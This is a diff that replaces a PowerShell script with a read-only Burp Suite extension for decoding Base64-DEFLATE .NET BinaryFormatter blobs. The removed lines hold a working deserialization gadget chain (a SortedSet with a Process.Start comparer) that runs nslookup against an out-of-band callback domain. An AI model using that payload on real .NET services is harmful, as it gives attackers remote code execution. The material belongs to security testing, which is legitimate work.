@@ -1,56 +1,220 @@
-# --- Configuration ---
-$domain = "tihgeugvaqszxdlzjzzd9pbnc7h91d97x.oast.fun"
-$command = "cmd.exe"
-$arguments = "/c nslookup $domain"
+# -*- coding: utf-8 -*-
+#
+# Burp Suite extension (Jython / Python 2.7)
+# "Base64 + DEFLATE .NET Decoder"
+#
+# Adds a read-only message-editor tab called "Decoded .NET".
+# It scans a request/response for a Base64 blob that unpacks as raw DEFLATE
+# (RFC 1951), inflates it, and pretty-prints the result:
+#   * the readable strings inside the .NET BinaryFormatter stream
+#     (assembly names, type names, field names)
+#   * any nested gzip chunk, decompressed (e.g. an embedded win.ini)
+#
+# Install:
+#   1. Install Jython standalone jar and point Burp at it
+#      (Extensions -> Extension settings -> Python environment).
+#   2. Extensions -> Installed -> Add -> Extension type: Python -> select this file.
+#   3. Open a request/response that contains the blob; click the "Decoded .NET" tab.
+#
+# This is an inspection aid only. It never modifies traffic.
 
-# --- Payload Construction ---
-Write-Host "[*] Building nslookup Deserialization payload..." -ForegroundColor Cyan
+from burp import IBurpExtender, IMessageEditorTabFactory, IMessageEditorTab
+from java.util import Base64
+from java.util.zip import Inflater, GZIPInputStream
+from java.io import ByteArrayInputStream, ByteArrayOutputStream
+import jarray
+import re
 
-# 1. Create a delegate bound to Process.Start(string, string)
-$processType = [System.Diagnostics.Process]
-$startMethod = $processType.GetMethod('Start', [Type[]]@([string], [string]))
-$maliciousDelegate = [System.Delegate]::CreateDelegate([System.Comparison[string]], $startMethod)
+# A run of base64 characters long enough to be a real payload, not noise.
+B64_RE = re.compile(r'[A-Za-z0-9+/]{40,}={0,2}')
+GZIP_MAGIC = [0x1f, 0x8b, 0x08]
 
-# 2. Load the internal ComparisonComparer<string> type via Reflection
-$mscorlib = [System.Reflection.Assembly]::Load("mscorlib")
-$comparisonComparerType = $mscorlib.GetType("System.Collections.Generic.ComparisonComparer``1").MakeGenericType([string])
 
-# 3. Create an instance of ComparisonComparer<string> with the malicious delegate
-$comparisonDelegateType = [System.Comparison[string]]
-$constructor = $comparisonComparerType.GetConstructor([Type[]]@($comparisonDelegateType))
-$maliciousComparer = $constructor.Invoke(@($maliciousDelegate))
+def b64decode(text):
+    # MIME decoder ignores newlines / stray whitespace inside the blob.
+    return Base64.getMimeDecoder().decode(text)
 
-# 4. Create a SortedSet and populate it with dummy data using the default comparer
-$sortedSet = New-Object 'System.Collections.Generic.SortedSet[string]'
-$sortedSet.Add("dummy1") | Out-Null
-$sortedSet.Add("dummy2") | Out-Null
 
-# 5. Dynamically find the internal comparer field and swap it
-$fields = $sortedSet.GetType().GetFields([System.Reflection.BindingFlags]'NonPublic, Instance')
-$comparerField = $fields | Where-Object { $_.FieldType -eq [System.Collections.Generic.IComparer[string]] } | Select-Object -First 1
+def inflate(data, nowrap):
+    """Inflate a java byte[]; nowrap=True -> raw DEFLATE (RFC1951),
+    nowrap=False -> zlib-wrapped (RFC1950). Returns java byte[] or None."""
+    inf = Inflater(nowrap)
+    inf.setInput(data)
+    out = ByteArrayOutputStream()
+    buf = jarray.zeros(4096, 'b')
+    try:
+        while not inf.finished():
+            n = inf.inflate(buf)
+            if n == 0:
+                if inf.needsInput() or inf.needsDictionary():
+                    break
+            else:
+                out.write(buf, 0, n)
+    except Exception:
+        return None
+    finally:
+        inf.end()
+    result = out.toByteArray()
+    return result if len(result) > 0 else None
 
-if (-not $comparerField) {
-    Write-Host "[-] Could not find comparer field dynamically. Aborting." -ForegroundColor Red
-    exit
-} else {
-    Write-Host "[+] Found comparer field: '$($comparerField.Name)'" -ForegroundColor Green
-}
 
-$comparerField.SetValue($sortedSet, $maliciousComparer)
+def try_inflate(data):
+    # Prefer raw DEFLATE (what the QSCToolkit blob uses); fall back to zlib.
+    return inflate(data, True) or inflate(data, False)
 
-# --- Serialization ---
-Write-Host "[*] Serializing object..." -ForegroundColor Cyan
-try {
-    $formatter = New-Object System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
-    $ms = New-Object System.IO.MemoryStream
-    $formatter.Serialize($ms, $sortedSet)
-    
-    $payload = $ms.ToArray()
-    if ($payload.Length -eq 0) { throw "Serialization returned empty." }
 
-    $base64Payload = [Convert]::ToBase64String($payload)
-    Write-Host "[+] Payload generated successfully!" -ForegroundColor Green
-    Write-Host "Base64 Payload: $base64Payload"
-} catch {
-    Write-Host "[-] Error: $_" -ForegroundColor Red
-}
+def gunzip_at(data, off):
+    """Decompress a gzip stream starting at offset `off` in java byte[] data."""
+    bis = ByteArrayInputStream(data, off, len(data) - off)
+    gz = GZIPInputStream(bis)
+    out = ByteArrayOutputStream()
+    buf = jarray.zeros(4096, 'b')
+    try:
+        while True:
+            n = gz.read(buf)
+            if n < 0:
+                break
+            out.write(buf, 0, n)
+    except Exception:
+        pass  # gzip streams are often followed by trailing serialized bytes
+    finally:
+        try:
+            gz.close()
+        except Exception:
+            pass
+    return out.toByteArray()
+
+
+def find_magic(data, pat):
+    offs = []
+    n = len(data)
+    m = len(pat)
+    for i in range(n - m + 1):
+        ok = True
+        for j in range(m):
+            if (data[i + j] & 0xff) != pat[j]:
+                ok = False
+                break
+        if ok:
+            offs.append(i)
+    return offs
+
+
+def extract_strings(data, minlen=4):
+    out = []
+    cur = []
+    for b in data:
+        c = b & 0xff
+        if 32 <= c < 127:
+            cur.append(chr(c))
+        else:
+            if len(cur) >= minlen:
+                out.append(''.join(cur))
+            cur = []
+    if len(cur) >= minlen:
+        out.append(''.join(cur))
+    return out
+
+
+def to_text(data):
+    return ''.join(chr(b & 0xff) for b in data)
+
+
+def find_candidate(message_text):
+    """Return the base64 substring that successfully inflates, if any."""
+    best = None
+    for m in B64_RE.finditer(message_text):
+        cand = m.group()
+        try:
+            raw = b64decode(cand)
+        except Exception:
+            continue
+        if try_inflate(raw) is not None:
+            if best is None or len(cand) > len(best):
+                best = cand
+    return best
+
+
+def build_report(b64text):
+    lines = []
+    raw = b64decode(b64text)
+    lines.append("[+] Base64 length : %d chars" % len(b64text))
+    lines.append("[+] Decoded bytes : %d" % len(raw))
+
+    inflated = try_inflate(raw)
+    if inflated is None:
+        lines.append("[!] Not a DEFLATE/zlib stream after base64 decode.")
+        return "\n".join(lines)
+
+    lines.append("[+] Inflated bytes: %d" % len(inflated))
+    lines.append("")
+    lines.append("=== Strings in inflated stream (.NET BinaryFormatter) ===")
+    for s in extract_strings(inflated):
+        lines.append("  " + s)
+
+    gz_offsets = find_magic(inflated, GZIP_MAGIC)
+    if gz_offsets:
+        lines.append("")
+        lines.append("=== Nested gzip payload(s) ===")
+        for off in gz_offsets:
+            inner = gunzip_at(inflated, off)
+            if inner is not None and len(inner) > 0:
+                lines.append("--- gzip @ offset %d (%d bytes) ---" % (off, len(inner)))
+                lines.append(to_text(inner))
+    return "\n".join(lines)
+
+
+class DecoderTab(IMessageEditorTab):
+    def __init__(self, extender, controller, editable):
+        self._helpers = extender._helpers
+        self._txt = extender._callbacks.createTextEditor()
+        self._txt.setEditable(False)
+        self._current = None
+
+    def getTabCaption(self):
+        return "Decoded .NET"
+
+    def getUiComponent(self):
+        return self._txt.getComponent()
+
+    def isEnabled(self, content, isRequest):
+        if content is None:
+            return False
+        try:
+            s = self._helpers.bytesToString(content)
+            return find_candidate(s) is not None
+        except Exception:
+            return False
+
+    def setMessage(self, content, isRequest):
+        self._current = content
+        if content is None:
+            self._txt.setText(None)
+            return
+        try:
+            s = self._helpers.bytesToString(content)
+            cand = find_candidate(s)
+            report = build_report(cand) if cand else "No inflatable base64 blob found."
+        except Exception, e:
+            report = "[!] Error: %s" % e
+        self._txt.setText(self._helpers.stringToBytes(report))
+
+    def getMessage(self):
+        return self._current
+
+    def isModified(self):
+        return False
+
+    def getSelectedData(self):
+        return self._txt.getSelectedText()
+
+
+class BurpExtender(IBurpExtender, IMessageEditorTabFactory):
+    def registerExtenderCallbacks(self, callbacks):
+        self._callbacks = callbacks
+        self._helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Base64 + DEFLATE .NET Decoder")
+        callbacks.registerMessageEditorTabFactory(self)
+
+    def createNewInstance(self, controller, editable):
+        return DecoderTab(self, controller, editable)
